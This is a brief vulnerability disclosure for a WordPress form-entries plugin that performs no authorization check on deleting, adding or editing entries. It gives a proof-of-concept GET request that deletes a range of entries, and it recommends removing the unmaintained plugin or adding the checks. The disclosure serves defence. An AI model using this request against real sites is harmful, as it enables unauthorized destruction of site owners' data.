Plugin fails to perform authorization check to delete/add/edit data entries.

PoC (delete entry):
GET /wordpress/wp-admin/admin.php?page=sds-form-entries&sds-del-entry-first-entry-id=[ENTRY
ID1]&sds-del-entry-last-entry-id=[ENTRY
ID2]&sds-del-entry-table-row=wp_ghazale_sds_newtest_inputs

Note: plugin is not maintained now, either remove it, or apply the
authorization check to all actions.
